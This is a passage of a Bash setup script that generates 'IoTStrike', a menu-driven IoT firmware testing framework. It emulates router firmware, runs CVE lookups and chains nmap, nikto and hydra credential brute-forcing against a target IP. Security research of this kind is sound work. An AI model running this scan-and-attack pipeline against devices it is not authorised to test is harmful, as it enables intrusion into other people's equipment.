    local EXTS=("*.tar" "*.tar.gz" "*.bin" "*.img" "*.zip" "*.trx" "*.chk" "*.dlf")
    mapfile -t CANDS < <(
        for d in "${DIRS[@]}"; do [[ -d "$d" ]] || continue
            for e in "${EXTS[@]}"; do find "$d" -maxdepth 2 -name "$e" -type f 2>/dev/null; done
        done | sort -u
    )

    if [[ ${#CANDS[@]} -eq 0 ]]; then
        warn "No firmware found in common locations."
        IFS= read -r -e -p "  Enter path manually (or press Enter to skip): " FW_PATH
        [[ -z "$FW_PATH" ]] && { info "Skipping preflight — use 'ingest <path>' in console."; return; }
    elif [[ ${#CANDS[@]} -eq 1 ]]; then
        ok "Found: ${CANDS[0]}"
        IFS= read -r -e -p "  Use this file? [Y/n]: " yn
        [[ "${yn,,}" == "n" ]] && { info "Skipping — use 'ingest <path>' in console."; return; }
        FW_PATH="${CANDS[0]}"
    else
        echo -e "  ${C}Found ${#CANDS[@]} firmware files:${RST}"
        for i in "${!CANDS[@]}"; do
            printf "    ${B}[%d]${RST}  %s\n" "$((i+1))" "${CANDS[$i]}"
        done
        echo -e "    ${B}[s]${RST}  Skip preflight"
        echo ""
        IFS= read -r -e -p "  Select [1-${#CANDS[@]}/s]: " SEL
        if [[ "$SEL" == "s" || -z "$SEL" ]]; then
            info "Skipping — use 'ingest <path>' in console."; return
        elif [[ "$SEL" =~ ^[0-9]+$ ]] && (( SEL >= 1 && SEL <= ${#CANDS[@]} )); then
            FW_PATH="${CANDS[$((SEL-1))]}"
        else
            warn "Invalid selection — skipping preflight."; return
        fi
    fi

    FW_PATH="$(realpath -e "$FW_PATH" 2>/dev/null || echo "$FW_PATH")"
    [[ ! -f "$FW_PATH" ]] && { fail "File not found: $FW_PATH"; return; }

    # Vendor auto-detect
    local BASE; BASE=$(basename "$FW_PATH" | tr '[:upper:]' '[:lower:]')
    VENDOR=""
    local -A VMAP=(
        ["netgear"]="netgear" ["wnap"]="netgear" ["wndr"]="netgear" ["dlink"]="dlink"
        ["dir-"]="dlink"      ["tplink"]="tplink" ["tp-link"]="tplink" ["archer"]="tplink"
        ["asus"]="asus"       ["rt-"]="asus"      ["linksys"]="linksys" ["wrt"]="linksys"
        ["draytek"]="draytek" ["vigor"]="draytek" ["belkin"]="belkin" ["buffalo"]="buffalo"
        ["zyxel"]="zyxel"     ["huawei"]="huawei" ["mikrotik"]="mikrotik"
        ["cisco"]="cisco"     ["ubiquiti"]="ubiquiti" ["unifi"]="ubiquiti"
    )
    for p in "${!VMAP[@]}"; do [[ "$BASE" == *"$p"* ]] && { VENDOR="${VMAP[$p]}"; break; }; done
    VENDOR="${VENDOR:-unknown}"

    ok "Firmware: $(basename "$FW_PATH")  |  Vendor: $VENDOR"
    _save_session

    # ── Background jobs ────────────────────────────────────────────────────────
    echo -e "  ${C}Starting background pre-processing jobs...${RST}"

    # Job 1: CVE Intelligence lookup (all output silenced except final alert)
    ( _cve_background_check "$VENDOR" ) >/dev/null 2>&1 &
    _track_job $! "CVE Intelligence — vendor: ${VENDOR}"
    ok "  [bg] CVE lookup started for vendor: $VENDOR"

    # Job 2: EMBA static analysis (only if installed)
    if [[ -d /opt/emba ]]; then
        local emba_log="$BASE_DIR/logs/emba_preflight_$(date +%Y%m%d_%H%M%S)"
        mkdir -p "$emba_log"
        local emba_bin="/opt/emba/emba.sh"
        [[ ! -f "$emba_bin" ]] && emba_bin="/opt/emba/emba"
        if [[ -f "$emba_bin" ]]; then
            ( bash "$emba_bin" -f "$FW_PATH" -l "$emba_log" -s \
                >"$emba_log/stdout.log" 2>&1 ) &
            _track_job $! "EMBA Static Analysis — log: ${emba_log}"
            ok "  [bg] EMBA static analysis started → $emba_log"
        fi
    else
        info "  [bg] EMBA not installed — skipping static analysis"
    fi

    echo ""
    ok "Background jobs running. Menu is ready — check [BG JOBS] section for status."
    echo ""
}

_ingest() {
    local path="${1:-}"
    if [[ -n "$path" ]]; then
        FW_PATH="$(realpath -e "$path" 2>/dev/null || echo "$path")"
        [[ ! -f "$FW_PATH" ]] && { fail "File not found: $FW_PATH"; return; }
    else
        _firmware_select || return
    fi

    local BASE; BASE=$(basename "$FW_PATH" | tr '[:upper:]' '[:lower:]')
    VENDOR=""
    local -A VMAP=(
        ["netgear"]="netgear" ["wnap"]="netgear" ["wndr"]="netgear" ["dlink"]="dlink"
        ["dir-"]="dlink"      ["tplink"]="tplink" ["tp-link"]="tplink" ["archer"]="tplink"
        ["asus"]="asus"       ["rt-"]="asus"      ["linksys"]="linksys" ["wrt"]="linksys"
        ["draytek"]="draytek" ["vigor"]="draytek" ["belkin"]="belkin" ["buffalo"]="buffalo"
        ["zyxel"]="zyxel"     ["huawei"]="huawei" ["mikrotik"]="mikrotik"
        ["cisco"]="cisco"     ["ubiquiti"]="ubiquiti" ["unifi"]="ubiquiti"
    )
    for p in "${!VMAP[@]}"; do [[ "$BASE" == *"$p"* ]] && { VENDOR="${VMAP[$p]}"; break; }; done
    VENDOR="${VENDOR:-unknown}"
    ok "Firmware: $(basename "$FW_PATH")  |  Vendor: $VENDOR"

    local TIMESTAMP; TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    SESSION_NAME="${VENDOR}_firmadyne_${TIMESTAMP}"
    TARGET_IP="192.168.0.100"
    EMULATOR="firmadyne"
    _save_session

    info "Starting Firmadyne emulation in background..."
    ( _run_firmadyne >"$BASE_DIR/logs/ingest_${TIMESTAMP}.log" 2>&1 ) &
    local BGPID=$!
    ok "Emulation started in background (PID: $BGPID)"
    ok "Log: $BASE_DIR/logs/ingest_${TIMESTAMP}.log"

    _cve_background_check "$VENDOR"
    ok "CVE lookup running in background"
    info "Use 'show jobs' to monitor progress. Use 'run' a scanner when the target is up."
}

_main_menu() {
    # Ensure strict-mode flags can never kill the menu loop.
    # Security tools (nmap, grep, hydra) routinely return non-zero; that is
    # not an error — it just means "nothing found".
    set +e +o pipefail

    # ── Persistent readline history so arrow keys work on the numbered prompt
    local _HIST_FILE="$HOME/.iotstrike_history"
    HISTFILE="$_HIST_FILE"
    HISTSIZE=1000
    HISTFILESIZE=2000
    history -r "$_HIST_FILE" 2>/dev/null || true

    while true; do
        # ── Banner ──────────────────────────────────────────────────────────
        clear
        echo -e "${BLD}${CYN}"
        figlet -f slant "IoTStrike" 2>/dev/null || echo "  IoTStrike"
        echo -e "${RST}"
        echo -e "  ${BLD}Universal IoT Security Framework${RST}"
        echo -e "  Emulate · Scan · CVE Intel · Sessions · Web UI · Reports"

        # ── Live Status Bar ─────────────────────────────────────────────────
        sep
        echo -e "  ${BLD}Active session:${RST} ${SESSION_NAME:-none}  |  ${BLD}Target:${RST} ${GRN}${TARGET_IP:-none}${RST}  |  ${BLD}Vendor:${RST} ${YEL}${VENDOR:-unknown}${RST}"

        # ── Background Jobs ─────────────────────────────────────────────────
        echo -e "  ${BLD}Background jobs:${RST}"
        _show_jobs
        sep
        echo ""

        # ── Numbered Menu ───────────────────────────────────────────────────
        echo -e "  ${BLD}${CYN}[1]${RST} 🔥 Emulate firmware     ${CYN}Firmadyne · FirmAE · EMBA${RST}"
        echo -e "  ${BLD}${CYN}[2]${RST} 🔍 Scan & attack        ${CYN}nmap · nikto · hydra · metasploit${RST}"
        echo -e "  ${BLD}${CYN}[3]${RST} 🕵 CVE intelligence      ${CYN}NVD API · auto-lookup · CVSS alerts${RST}"
        echo -e "  ${BLD}${CYN}[4]${RST} 💾 Session manager      ${CYN}save · restore · compare targets${RST}"
        echo -e "  ${BLD}${CYN}[5]${RST} 🌐 Web dashboard        ${CYN}live status at localhost:8080${RST}"
        echo -e "  ${BLD}${CYN}[6]${RST} 📄 Report generator     ${CYN}HTML + markdown export${RST}"
        echo -e "  ${BLD}${CYN}[0]${RST} Exit"
        echo ""

        # ── Prompt — plain numbered read, no iotstrike > ────────────────────
        IFS= read -r -e -p "  Select module [0-6]: " _choice || { echo ""; break; }

        # Save to readline history so arrow keys recall previous choices
        if [[ -n "$_choice" ]]; then
            history -s "$_choice"
            history -w "$_HIST_FILE"
        fi

        # Snapshot newest log before the action so we can detect what's new
        local _log_before _log_after
        _log_before=$(ls -t "$BASE_DIR/logs/"*.{txt,log,html,md} 2>/dev/null | head -1)

        case "$_choice" in
            1) _emulate_menu ;;
            2) _scan_menu ;;
            3) _cve_menu ;;
            4) _session_menu ;;
            5) _web_menu ;;
            6) _report_menu ;;
            0)
                _cleanup; exit 0 ;;
            "")
                continue ;;
            *)
                warn "Invalid — enter a number between 0 and 6"
                sleep 1
                continue ;;
        esac

        # ── Auto-display the newest log written during the action ────────────
        _log_after=$(ls -t "$BASE_DIR/logs/"*.{txt,log,html,md} 2>/dev/null | head -1)
        if [[ -n "$_log_after" && "$_log_after" != "$_log_before" ]]; then
            echo ""
            echo -e "${BLD}${CYN}── Log: $(basename "$_log_after") ──────────────────────────────${RST}"
            cat "$_log_after"
            echo -e "${BLD}${CYN}────────────────────────────────────────────────────────────${RST}"
        elif [[ -n "$_log_after" ]]; then
            echo ""
            echo -e "${BLD}${CYN}── Log: $(basename "$_log_after") ──────────────────────────────${RST}"
            tail -100 "$_log_after"
            echo -e "${BLD}${CYN}────────────────────────────────────────────────────────────${RST}"
        fi

        echo ""
        IFS= read -r -e -p "  Press Enter to return to menu..." _dummy
    done
}

# =============================================================================
# CLI FLAG HANDLER — non-interactive mode
# Usage: sudo bash IoTStrike.sh [--emulate <path>|--scan <ip>|--cve <vendor>|--report <fmt>]
# =============================================================================
if [[ $# -gt 0 ]]; then
    NON_INTERACTIVE=true
    _load_session

    _print_cli_help() {
        echo ""
        echo -e "  ${B}IoTStrike — CLI Flags${RST}"
        echo ""
        echo -e "  ${C}Interactive (default):${RST}"
        echo -e "    sudo bash $0"
        echo ""
        echo -e "  ${C}Non-interactive flags:${RST}"
        echo -e "    sudo bash $0 --emulate <firmware_path>   Emulate firmware via Firmadyne"
        echo -e "    sudo bash $0 --scan    <target_ip>       Full scan pipeline (nmap + nikto + hydra)"
        echo -e "    sudo bash $0 --cve     <vendor>          CVE lookup via NVD API"
        echo -e "    sudo bash $0 --report  <md|html>         Generate report from current session"
        echo -e "    sudo bash $0 --web     [port]            Start web API server (default: 8080)"
        echo ""
        echo -e "  ${C}Examples:${RST}"
        echo -e "    sudo bash $0 --emulate /home/kali/firmware.zip"
        echo -e "    sudo bash $0 --scan 192.168.0.100"
        echo -e "    sudo bash $0 --cve netgear"
        echo -e "    sudo bash $0 --cve tplink"
        echo -e "    sudo bash $0 --report html"
        echo -e "    sudo bash $0 --web 8080"
        echo ""
    }

    case "$1" in
        --emulate)
            [[ -z "${2:-}" ]] && { fail "Usage: $0 --emulate <firmware_path>"; exit 1; }
            FW_PATH="$(realpath -e "$2" 2>/dev/null || echo "$2")"
            [[ ! -f "$FW_PATH" ]] && { fail "File not found: $FW_PATH"; exit 1; }
            info "Non-interactive emulation: $FW_PATH"
            source "$BASE_DIR/tools/bin/activate" 2>/dev/null || true
            _run_firmadyne
            ;;
        --scan)
            [[ -z "${2:-}" ]] && { fail "Usage: $0 --scan <target_ip>"; exit 1; }
            [[ ! "$2" =~ ^[0-9a-zA-Z._:-]+$ ]] && { fail "Invalid target: $2"; exit 1; }
            TARGET_IP="$2"
            _save_session
            info "Non-interactive scan pipeline against ${B}$TARGET_IP${RST}..."
            _nmap_quick
            _nmap_full
            _nikto_scan
            _hydra_scan
            ok "Scan pipeline complete"
            ;;
        --cve)
            [[ -z "${2:-}" ]] && { fail "Usage: $0 --cve <vendor>"; exit 1; }
            VENDOR="$2"
            info "Non-interactive CVE lookup: ${B}$VENDOR${RST}"
            _cve_lookup "$VENDOR" "" ""
            ;;
        --report)
            fmt="${2:-md}"
            [[ "$fmt" != "md" && "$fmt" != "html" ]] && { fail "Format must be 'md' or 'html'"; exit 1; }
            info "Generating ${fmt} report..."
            _gen_report "$fmt"
            ;;
        --web)
            _port="${2:-8080}"
            if ! command -v python3 &>/dev/null; then
                fail "python3 not found"; exit 1
            fi
            _srv="$BASE_DIR/iot_web_server.py"
            if [[ ! -f "$_srv" ]]; then
                fail "Web server not found: $_srv"
                echo -e "  ${Y}Copy iot_web_server.py to $BASE_DIR first${RST}"; exit 1
            fi
            info "Starting IoTStrike Web UI on port $_port..."
            python3 "$_srv" --port "$_port"
            ;;
        --help|-h)
            _print_cli_help; exit 0 ;;
        *)
            fail "Unknown flag: $1"
            echo -e "  Run: sudo bash $0 --help"
            exit 1
            ;;
    esac
    exit 0
fi

_startup_preflight
_main_menu
RUNNER_EOF

chmod +x "$BASE_DIR/IoTStrike.sh"
ok "IoTStrike.sh runner generated"

# =============================================================================
# FINAL SUMMARY
# =============================================================================
echo ""
sep
echo -e "  ${BLD}${GRN}IoTStrike Setup Complete!${RST}"
sep

if [[ ${#ERRORS[@]} -gt 0 ]]; then
    echo ""
    echo -e "  ${YEL}${BLD}Non-fatal warnings:${RST}"
    for e in "${ERRORS[@]}"; do echo -e "    ${YEL}•${RST} $e"; done
fi

echo ""
echo -e "  ${BLD}Launch:${RST}"
echo -e "    ${GRN}sudo bash $BASE_DIR/IoTStrike.sh${RST}"
echo ""
echo -e "  ${BLD}Installed at:${RST}   $BASE_DIR"
echo -e "  ${BLD}Firmadyne:${RST}      $FIRM_DIR"
echo -e "  ${BLD}Sessions:${RST}       $BASE_DIR/sessions/"
echo -e "  ${BLD}Reports:${RST}        $BASE_DIR/reports/"
echo -e "  ${BLD}Web dashboard:${RST}  http://localhost:8080 (start from menu)"
echo ""
echo -e "  ${BLD}Clean reinstall:${RST}"
echo -e "    sudo rm -rf $BASE_DIR && sudo bash IoTStrike_setup.sh"
echo ""
echo -e "  ${CYN}Setup log: $SETUP_LOG${RST}"
sep
echo ""
